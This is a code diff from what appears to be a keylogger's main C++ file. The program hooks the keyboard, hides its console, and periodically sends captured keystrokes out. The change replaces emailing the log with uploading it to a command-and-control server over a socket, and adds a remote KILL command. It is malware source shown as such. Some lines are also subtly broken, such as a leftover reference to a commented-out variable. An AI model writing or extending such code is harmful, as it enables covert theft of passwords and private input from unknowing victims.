@@ -8,6 +8,7 @@
 // TODO create new email
 // TODO look for strings in executable
 // TODO potentially send debug logs back to user as well
+// TODO see about exiting without joinging thread
 
 #include <iostream>
 #include <filesystem>
@@ -21,8 +22,7 @@
 #include "Timer.h"
 #include "MailUtils.h"
 #include "KeyboardManager.h"
-
-using namespace std;
+#include "Socket.h"
 
 // MailTimer Handler function
 void DumpKeylog()
@@ -39,13 +39,34 @@ void DumpKeylog()
 	}
 
 	// std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetOutputPath(true));
-	int x = MailUtils::SendMail("Log [" + filename + "]", "", filename);
+	// int x = MailUtils::SendMail("Log [" + filename + "]", "", filename);
+
+	// Open connection with comand and control server
+	Socket ccSocket(CC_HOSTNAME, CC_PORT);
+	if (!ccSocket.isActive())
+		IO::WriteAppLog("Connection to " + CC_HOSTNAME + + " on port " + CC_PORT + "failed");
+
+	RESPONSE_CODE res = ccSocket.sendFile(filename);	
+	if (res == KILL)
+	{
+		KeyboardManager::GetInstance().UninstallHooks();
+		exit(0);
+	}
+	else if (res == FAILURE)
+	{
+		IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
+	}
+	else if (res == SUCCESS)
+	{
+		KeyboardManager::GetInstance().keylog = "";
+		IO::WriteAppLog("Successfully sent log");
+	}
 
 	// If script execution returned success
-	if (x != 7)
-		IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
-	else
-		KeyboardManager::GetInstance().keylog = "";
+	// if (x != 7)
+	// 	IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
+	// else
+	// 	KeyboardManager::GetInstance().keylog = "";
 }
 
 int main(int argc, char** argv)
@@ -57,8 +78,8 @@ int main(int argc, char** argv)
 	KeyboardManager::GetInstance().InstallHooks();
 
 	// Create and Start mail timer
-	Timer mailTimer(DumpKeylog, FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
-	mailTimer.Start(true);
+	Timer dumpTimer(DumpKeylog, FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
+	dumpTimer.Start(true);
 	IO::WriteAppLog("Mail Timer Started");
 
 	// Run infinite loop and prevent console window from showing
@@ -70,6 +91,7 @@ int main(int argc, char** argv)
 	}
 
 	KeyboardManager::GetInstance().UninstallHooks();
-	mailTimer.Stop();
+	dumpTimer.Stop();
+
 	return 0;
 }
